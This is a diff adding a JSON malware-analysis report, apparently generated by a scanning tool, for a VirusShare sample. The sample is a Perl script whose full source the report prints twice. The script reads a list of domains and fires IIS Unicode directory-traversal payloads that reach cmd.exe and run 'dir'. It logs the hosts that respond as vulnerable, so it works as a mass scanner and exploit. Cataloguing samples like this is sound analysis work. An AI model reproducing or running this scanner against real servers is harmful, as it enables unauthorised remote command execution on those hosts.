@@ -1,0 +1,82 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "open": "May open a file",
+            "write": "May write to a file"
+        },
+        "macro": "#!/usr/bin/perl\n# Greetz\n# c0d3d by acid and cartman\n# c4r7m4n, x4n3x, 1mp1, 3mmm 31tch, ScHm0uLd3rz\n# u3b3r l1x - emmaich \nuse Socket;\n# --------------init\nif ($#ARGV<0) {die \"timay.pl v1.end\n\nusage: timmmaaaayy.pl filename\nwhere filename contains a list of domains to try\\n\";}\n\n$filename = @ARGV[0];\n$port=80;\n\nopen FOO, \"< $filename\";\nopen DEBUG, \"> h4x0r.debug\";\n\nprint DEBUG \"Start search\\n\";\nwhile (<FOO>) {\nopen h4x0r, \">> h4x0r\";\nchomp;\n$host = $_;\n$target = inet_aton($host);\n\n# Just in case we have the wrong info\nif (!($target)) { print DEBUG \"DEBUG host: $host does not resolve\\n\"; next;\n}\nelse { print DEBUG \"DEBUG host: $host resolved\\n\";\n}\n\nprint \"$host : \";\n\n@tests =\n(\"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir\",\n\"/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir\",\n\"/scripts/../winnt/system32/cmd.exe?/c+dir\",\n\"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir\",\n\"/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",\n\"/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",\n\"/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",\n\"/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",\n\"/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",\n\"/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",\n\"/msadc/..\\%e0\\%80\\%af../..\\%e0\\%80\\%af../..\\%e0\\%80\\%af../winnt/system32/cmd.exe\\?/c\\+dir\");\n\nfor ($i=0;$i<=$#tests;$i++) { my @results=sendraw(\"GET $tests[$i] HTTP/1.0\\r\\n\\r\\n\"); foreach $line (@results){ if ($line =~ /Directory/) {  push(@vuln,$i+1); } }\n}\n\n# Now we figure out if we were vulnerable or not.\nif ($#vuln > -1) { print DEBUG \"DEBUG host: $host vulnerable\\n\"; print h4x0r \"$host : \"; print \"Vulnerable to test(s) : \"; print h4x0r \"Vulnerable to test(s) : \"; for ($i=0;$i<=$#vuln;$i++) { $v = pop(@vuln); print h4x0r \"$v \"; print \"$v \"; } print h4x0r \"\\n\"; print \"\\n\";\n}\nelse {  print DEBUG \"DEBUG host: $host not vulnerable\\n\"; print \"Not Vulnerable\\n\";\n} print DEBUG \"DEBUG Forcing a sync/write to file..\"; close hax0r; # Stupid but forces a write print DEBUG \"succeeded.\\n\";\n} # End the while loop\nprint DEBUG \"DEBUG END of search\\n\";\nclose DEBUG;\nclose h4x0r;\nclose FOO;\n\n# ------------- Sendraw - thanx RFP rfp@wiretrip.net\nsub sendraw {   # this saves the whole transaction anyway my ($pstr)=@_; socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die(\"Socket problems\\n\"); if(connect(S,pack \"SnA4x8\",2,$port,$target)){ my @in; select(S);      $|=1;   print $pstr; while(<S>){ push @in, $_;} select(STDOUT); close(S); return @in; } else { die(\"Can't connect...\\n\"); }\n}"
+    },
+    "filename": "VirusShare_4044cc8e8d8ba85a78a806ac3bb6a617",
+    "filesize": 2783,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "4044cc8e8d8ba85a78a806ac3bb6a617",
+        "sha1": "8846626fdbd310dcc7c24c4e42c5440f97bdacd6",
+        "sha256": "973f0f34d295950f9606661dc86a89cca93f2e60e0fc7a8774d9ad1f7deee39d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "# Greetz",
+            "# c0d3d by acid and cartman",
+            "# c4r7m4n, x4n3x, 1mp1, 3mmm 31tch, ScHm0uLd3rz",
+            "# u3b3r l1x - emmaich ",
+            "use Socket;",
+            "# --------------init",
+            "if ($#ARGV<0) {die \"timay.pl v1.end",
+            "usage: timmmaaaayy.pl filename",
+            "where filename contains a list of domains to try\\n\";}",
+            "$filename = @ARGV[0];",
+            "$port=80;",
+            "open FOO, \"< $filename\";",
+            "open DEBUG, \"> h4x0r.debug\";",
+            "print DEBUG \"Start search\\n\";",
+            "while (<FOO>) {",
+            "open h4x0r, \">> h4x0r\";",
+            "chomp;",
+            "$host = $_;",
+            "$target = inet_aton($host);",
+            "# Just in case we have the wrong info",
+            "if (!($target)) { print DEBUG \"DEBUG host: $host does not resolve\\n\"; next;",
+            "else { print DEBUG \"DEBUG host: $host resolved\\n\";",
+            "print \"$host : \";",
+            "@tests =",
+            "(\"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/scripts/../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir\",",
+            "\"/msadc/..\\%e0\\%80\\%af../..\\%e0\\%80\\%af../..\\%e0\\%80\\%af../winnt/system32/cmd.exe\\?/c\\+dir\");",
+            "for ($i=0;$i<=$#tests;$i++) { my @results=sendraw(\"GET $tests[$i] HTTP/1.0\\r\\n\\r\\n\"); foreach $line (@results){ if ($line =~ /Directory/) {  push(@vuln,$i+1); } }",
+            "# Now we figure out if we were vulnerable or not.",
+            "if ($#vuln > -1) { print DEBUG \"DEBUG host: $host vulnerable\\n\"; print h4x0r \"$host : \"; print \"Vulnerable to test(s) : \"; print h4x0r \"Vulnerable to test(s) : \"; for ($i=0;$i<=$#vuln;$i++) { $v = pop(@vuln); print h4x0r \"$v \"; print \"$v \"; } print h4x0r \"\\n\"; print \"\\n\";",
+            "else {  print DEBUG \"DEBUG host: $host not vulnerable\\n\"; print \"Not Vulnerable\\n\";",
+            "} print DEBUG \"DEBUG Forcing a sync/write to file..\"; close hax0r; # Stupid but forces a write print DEBUG \"succeeded.\\n\";",
+            "} # End the while loop",
+            "print DEBUG \"DEBUG END of search\\n\";",
+            "close DEBUG;",
+            "close h4x0r;",
+            "close FOO;",
+            "# ------------- Sendraw - thanx RFP rfp@wiretrip.net",
+            "sub sendraw {   # this saves the whole transaction anyway my ($pstr)=@_; socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die(\"Socket problems\\n\"); if(connect(S,pack \"SnA4x8\",2,$port,$target)){ my @in; select(S);      $|=1;   print $pstr; while(<S>){ push @in, $_;} select(STDOUT); close(S); return @in; } else { die(\"Can't connect...\\n\"); }"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.290023",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
